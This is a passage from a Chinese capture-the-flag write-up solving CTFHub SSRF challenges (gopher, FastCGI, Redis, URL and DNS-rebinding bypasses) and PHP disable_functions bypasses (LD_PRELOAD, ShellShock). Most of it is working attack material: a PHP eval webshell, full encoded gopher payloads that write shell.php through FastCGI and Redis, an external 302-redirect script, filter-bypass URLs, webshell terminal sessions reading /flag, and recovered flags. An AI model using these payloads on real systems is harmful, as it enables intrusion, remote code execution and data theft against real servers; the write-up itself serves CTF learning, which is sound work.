Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCwDRYcG3y5cgtLpG
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundaryCwDRYcG3y5cgtLpG
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

<?php @eval($_POST['t0ur1st']); ?>
------WebKitFormBoundaryCwDRYcG3y5cgtLpG--
"""

encode_s = quote(s)
print(encode_s)
```

运行代码后得到：

```
POST%20/flag.php%20HTTP/1.1%0AHost%3A%20challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800%0AContent-Length%3A%20227%0ACache-Control%3A%20max-age%3D0%0AUpgrade-Insecure-Requests%3A%201%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/143.0.0.0%20Safari/537.36%0AOrigin%3A%20http%3A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.7%0AReferer%3A%20http%3A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800/%3Furl%3D127.0.0.1/flag.php%0AAccept-Encoding%3A%20gzip%2C%20deflate%2C%20br%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%2Cen-US%3Bq%3D0.8%2Cen%3Bq%3D0.7%0AConnection%3A%20keep-alive%0A%0A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%221.php%22%0AContent-Type%3A%20application/octet-stream%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%3B%20%3F%3E%0A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%0A
```

将所有的%0A修改为%0D%0A，再进行二次URL编码得到：

```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520227%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/143.0.0.0%2520Safari/537.36%250D%250AOrigin%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen-US%253Bq%253D0.8%252Cen%253Bq%253D0.7%250D%250AConnection%253A%2520keep-alive%250D%250A%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%250D%250A
```

我们再加上`gopher://127.0.0.1:80/_`，由于gopher协议支持发出GET和POST请求，所以无需再构造`POST`请求，直接发送`GET`请求也可。

http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520227%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/143.0.0.0%2520Safari/537.36%250D%250AOrigin%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen-US%253Bq%253D0.8%252Cen%253Bq%253D0.7%250D%250AConnection%253A%2520keep-alive%250D%250A%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%250D%250A

靶机显示的信息如下：

```
HTTP/1.1 200 OK Date: Thu, 08 Jan 2026 10:58:05 GMT Server: Apache/2.4.25 (Debian) X-Powered-By: PHP/5.6.40 Content-Length: 32 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 ctfhub{e631c5e7332eee694ba91881}
```

提交`flag`即可。

------

### FastCGI协议

> 这次，我们需要攻击一下fastcgi协议咯，也许附件的文章会对你有点帮助。

FastCGI是一种用于数据传输的通信协议，与HTTP协议相似，它提供了一个进行数据交换的通道。

- HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。
- 类比HTTP协议来说，FastCGI协议则是服务器中间件和某个语言后端进行数据交换的协议。FastCGI协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照FastCGI的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

这里引入一个GitHub项目https://github.com/tarunkant/Gopherus，在Kali中安装。

```bash
git clone https://github.com/tarunkant/Gopherus.git
```

编写`PHP`一句话木马：

```php
<?php @eval($_POST['t0ur1st']); ?>
```

用`python`对其进行`base64`编码。

```python
>>> from base64 import b64encode
>>> b64encode(b"<?php @eval($_POST['t0ur1st']); ?>")
b'PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg=='
```

这里需要先学习一个命令行，可以对以上`base64`字符串进行`base64`解码，并将结果写入`shell.php`。

```
echo PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg== | base64 -d > shell.php
```

在`Kali`系统中输入以下命令启动`Gopherus`，以准备好利用SSRF漏洞的`payload`。

```
┌──(t0ur1st㉿kali)-[~/Tools]
└─$ python2 Gopherus/gopherus.py --exploit fastcgi

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  index.php                                                                                               
Terminal command to run:  echo PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg== | base64 -d > shell.php

Your gopher link is ready to do SSRF:                                             

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH129%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%81%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%3D%3D%20%7C%20base64%20-d%20%3E%20shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------
```

编写`Python`代码进行`URL`编码：

```python
from urllib.parse import quote

s = """gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH129%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%81%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%3D%3D%20%7C%20base64%20-d%20%3E%20shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"""

encode_s = quote(s)
print(encode_s)
```

URL编码结果如下：

```
gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F7%2507%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH129%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2581%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%253D%253D%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

直接访问http://challenge-b305a1ef0d47257f.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F7%2507%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH129%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2581%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%253D%253D%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500，可以得到以下信息：

> X-Powered-By: PHP/5.6.40 Content-type: text/html; charset=UTF-8 -----Made-by-SpyD3r----- UTF

这说明啥？还记不记得我们的一句话木马？它已经上传成功啦。

不信就访问`/?url=file:///var/www/html/shell.php`查看文件内容，右键查看源码可以看到信息：

```php
<?php @eval($_POST['t0ur1st']); ?>
```

用`AntSword`连接靶机http://challenge-b305a1ef0d47257f.sandbox.ctfhub.com:10800/shell.php。

可以在靶机服务器根目录发现文件`flag_febda5bc5ff5614e0e366369a0251431`，打开后看到`flag`。

提交`ctfhub{6388fe22d26f0e4fdccb7f62}`即可。

------

### Redis协议

> 这次来攻击redis协议吧。redis://127.0.0.1:6379。资料？没有资料！自己找！

这道题还是需要用到上一道题的`Gopherus`工具。

与上一道题不同的是，这一道题我们需要用到的命令行是：

```php
<?php @eval($_POST['t0ur1st']) ?>
```

在`Kali`系统中输入以下命令启动`Gopherus`，以准备好利用SSRF漏洞的`payload`。

```
┌──(t0ur1st㉿kali)-[~/Tools]
└─$ python2 Gopherus/gopherus.py --exploit redis  

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

Ready To get SHELL
What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell): <?php @eval($_POST['t0ur1st']) ?>

Your gopher link is Ready to get PHP Shell:                                       

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. 

-----------Made-by-SpyD3r-----------
```

编写`Python`代码进行`URL`编码：

```python
from urllib.parse import quote

s = """gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"""

encode_s = quote(s)
print(encode_s)
```

URL编码结果如下：

```
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252437%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

直接访问http://challenge-7db7a1a477367662.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252437%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A，如果出现了504 Gateway Time-out没关系。

访问靶机的`/?url=file:///var/www/html/shell.php`，可以看到信息如下：

```
REDIS0007�	redis-ver3.2.6�
redis-bits�@�ctime�	�_i�used-mem�����%

<?php @eval($_POST['t0ur1st']) ?>

���p[���
```

用`AntSword`连接靶机http://challenge-7db7a1a477367662.sandbox.ctfhub.com:10800/shell.php。

可以在靶机服务器根目录发现文件`flag_8669661efdfe081c68b3c723f485d41d`，打开后看到`flag`。

提交`ctfhub{b5655e9078c811a62e33962e}`即可。

------

### URL Bypass

>  请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧

进入靶机后看到信息：

> url must startwith "http://notfound.ctfhub.com"

我们借助@语法绕过程序对域名的常规校验，notfound.ctfhub.com 用来 “占位”，从而利用主域名服务端，让它去请求@后的内网地址127.0.0.1/flag.php当真实目标去请求，以获取外网无法直接访问但内网可访问的flag文件内容。 

构造`GET`请求`/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php`，这样可以让靶机的服务端请求内网地址127.0.0.1/flag.php，得到`ctfhub{491de14129e42cca16863c39}`。

------

### 数字IP Bypass

> 这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

如果直接访问`/?url=127.0.0.1/flag.php`，会出现信息：

> hacker! Ban '/127|172|@/'

我们尝试用`localhost`代替`127.0.0.1`，构造`GET`请求`/?url=localhost/flag.php`，得到`flag`。

提交`ctfhub{354f172a4b9d453e56a243e3}`即可。

------

### 302跳转 Bypass

> SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。

访问靶机的`/?url=file:///var/www/html/flag.php`，可以看到禁止访问`127.0.0.1`。

```php
<?php
error_reporting(0);
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    exit;
}
echo getenv("CTFHUB");
```

我们可以像上一道题的做法一样，通过构造`GET`请求`/?url=localhost/flag.php`绕过，拿到`flag`。

如果要正儿八经的302跳转绕过法，我们需要一台公网服务器，然后在`/var/www/html/`新建`PHP`文件`redirect.php`，内容如下：

```php
<?php
// 当目标系统请求此脚本时，返回302重定向
header("Location: http://127.0.0.1/flag.php"); // 要访问的内网地址
exit();
?>
```

然后在靶机构造`GET`请求`/?url=https://tanyaodan.com/redirect.php`，可以通过302跳转访问靶机的http://127.0.0.1/flag.php，目标服务器上的cURL客户端（配置了 CURLOPT_FOLLOWLOCATION = TRUE）在接收到302响应后，会自动地、不加验证地向 Location 头指定的新地址（即内网的 http://127.0.0.1/flag.php）发起第二次请求。由于这次请求是从服务器内网发起的（127.0.0.1就是本机），它成功绕过了网络边界防护，访问到了原本无法从外网直接访问的 flag.php。

分步骤细说，①目标系统的curl解析url参数，向http://你的服务器域名/redirect.php发送请求。②外部服务器返回 302 响应，Location为http://127.0.0.1/flag.php。③由于CURLOPT_FOLLOWLOCATION = 1，curl自动跟随重定向，向127.0.0.1/flag.php发送请求。④此时访问的是内网地址，但由于跳转发生在curl内部，目标系统的正则检测仅针对初始url参数（已通过），无法拦截后续跳转，最终获取到内网资源（如 Flag）。

提交`ctfhub{63411b744563f9616498e842}`即可。

------

### DNS重绑定 Bypass

> 关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助。

虚假的附件链接：https://zhuanlan.zhihu.com/p/89426041

真正的附件链接：https://lock.cmpxchg8b.com/rebinder.html

访问靶机的`/?url=file:///var/www/html/flag.php`，依旧可以看到禁止访问`127.0.0.1`。

```php
<?php
error_reporting(0);
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    exit;
}
echo getenv("CTFHUB");
```

我们在A输入`127.0.0.1`，B输入`127.0.0.2`，可以生成一个链接7f000001.7f000002.rbndr.us。

实现DNS重绑定后，我们访问靶机`/?url=7f000001.7f000002.rbndr.us/flag.php`可以得到`flag`。

提交`ctfhub{aefa77faef415b880f08c438}`即可。

------

## PHP Bypass disable_function

### LD_PRELOAD

> 目标：获取服务器上 /flag 文件中的 flag。需要了解 Linux LD_PRELOAD 环境变量。

`LD_PRELOAD`绕过PHP禁用函数的技术原理是利用`Linux`环境变量优先加载恶意`.so`文件，劫持系统函数执行流程，当调用启动新进程的PHP函数时执行自定义命令。使用蚁剑工具的`disable_functions`插件，自动生成代理脚本和`.so`文件，成功绕过`LD_PRELOAD`靶机的函数限制。**LD_PRELOAD**绕过手法的核心在于**劫持系统函数**，让目标程序加载我们精心构造的恶意动态链接库（`.so`文件）。

- LD_PRELOAD 环境变量：在Linux系统中，LD_PRELOAD是一个环境变量，它可以让你定义一个在程序运行前优先加载的动态链接库（.so文件）。这个优先加载的库中的函数可以覆盖后续加载的标准库中的同名函数 。
- 劫持系统函数：如果我们可以让一个外部程序在运行时加载我们恶意的.so库，并且这个库里定义了某个系统函数（例如getuid、geteuid等），那么当该外部程序调用这个系统函数时，执行的就会是我们的恶意代码 。
- PHP 函数的利用：在PHP中，我们需要找到一个能够启动新进程的函数（因为`LD_PRELOAD`是在程序启动时加载），通过这个新进程来加载我们的恶意库。常用的函数有`mail()` 或`error_log()` 。这些函数在底层会调用外部系统程序（如`mail()`会调用`/usr/sbin/sendmail`），从而创建新的进程。
- 构造恶意动态链接库：我们创建一个C文件，其中定义一个在库加载时就会自动执行的函数（使用`__attribute__(constructor)`属性 ），或者劫持一个特定的、无参数且常用的系统函数（如`getuid()`或`geteuid()`）。在这个函数里执行我们想要的系统命令（例如读取`flag`）。

> #### 使用蚁剑进行 LD_PRELOAD 绕过
>
> 蚁剑（AntSword） 是一款强大的Webshell管理工具，它集成了Bypass disable_function的插件，可以自动化上述过程。以下是具体步骤。
>
> - 连接Webshell：使用蚁剑成功连接到目标网站的Webshell。
> - 检查限制与寻找可用函数：
>   - 连接成功后，尝试在虚拟终端里执行命令（如whoami），可能会发现命令无法执行（例如返回ret=127 ）。
>   - 此时，你需要查看phpinfo信息，确认disable_functions列表，并留意是否有未被禁用的、可以启动外部进程的函数，如error_log。如果mail函数被禁用，可以尝试使用error_log函数 。
>
> - 使用 Bypass Disable Functions 插件：
>   - 在蚁剑中，找到并加载"Bypass Disable Functions"插件。
>   - 选择 LD_PRELOAD 模式。
>   - 根据目标环境，选择合适的进程函数。如果mail不可用，就选择error_log 。
>   - 点击"开始"按钮执行。插件会自动完成以下工作 ：
>     - 在服务器上生成恶意的.so文件（例如，使用`__attribute__(constructor)`属性的C代码编译而成，其中的命令可能是/readflag > /tmp/flag.txt ）。
>     - 在网站目录下生成一个代理脚本（例如antproxy.php ），这个脚本会设置LD_PRELOAD环境变量并调用选定的进程函数。
>   - 重新连接并获取Flag：
>     - 使用蚁剑重新连接新生成的代理脚本的URL（密码通常与原Webshell相同）。
>     - 连接成功后，现在你应该可以在蚁剑的虚拟终端中正常执行系统命令了 。
>     - 执行读取flag的命令（例如cat /flag或执行/readflag ），即可成功获取flag。

进入靶机后，`view-source`查看源码信息如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— LD_PRELOAD</title>
</head>
<body>
    <h1>CTFHub Bypass disable_function —— LD_PRELOAD</h1>
    <p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

本题考察LD_PRELOAD绕过disable_function限制的技术。题目提供一个通过`ant`参数执行任意PHP代码的入口，但关键系统命令函数已被禁用。攻击核心在于利用Linux的`LD_PRELOAD`环境变量——该变量允许在程序运行时优先加载自定义共享库。通过`putenv`设置`LD_PRELOAD`指向恶意编译的`.so`文件，再调用`mail()`、`error_log()`等仍可用的PHP函数触发子进程创建，从而劫持库函数执行流程。这种技术巧妙地将PHP代码执行转化为系统命令执行，有效绕过函数禁用限制，最终获取服务器权限。

用`AntSword`连接靶机后，打开虚拟终端，发现在`php.ini`中禁用了一些命令执行函数。

```
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-15ac886475f1924c-58d7c57699-mb8xm 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls
ret=127
```

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。在插件中选择模式**`LP_PRELOAD`**，点击开始即可。

用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。

编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-15ac886475f1924c-58d7c57699-mb8xm 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /flag
cat: /flag: Permission denied
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{c0e71d95503c24d9860e804a}
```

提交`ctfhub{c0e71d95503c24d9860e804a}`即可。

------

### ShellShock

> 利用PHP破壳完成 Bypass

ShellShock漏洞（CVE-2014-6271）是一种Bash shell中的高危漏洞，攻击者可通过构造恶意环境变量在Bash子进程中执行任意命令。在本题中，该漏洞被用于绕过PHP的`disable_functions`限制，实现系统命令执行并获取flag。‌

打开靶机后，`view-source`看到源码信息如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— ShellShock</title>
    <meta charset="UTF-8">
</head>
<body>
<h1>CTFHub Bypass disable_function —— ShellShock</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

如果直接用`AntSword`连接靶机会报错，需要将默认编码设置为`base64`再连接靶机。连接靶机后，如果直接访问根目录会出现错误：Path Not Found Or No Permission!

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`Apache_mod_cgi`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-261d04b664bcd288-5c8bc4b78-q44kc 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
selinux
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{5097a29aa3a4e57e518c5b66}
```

提交`ctfhub{5097a29aa3a4e57e518c5b66}`即可。

------

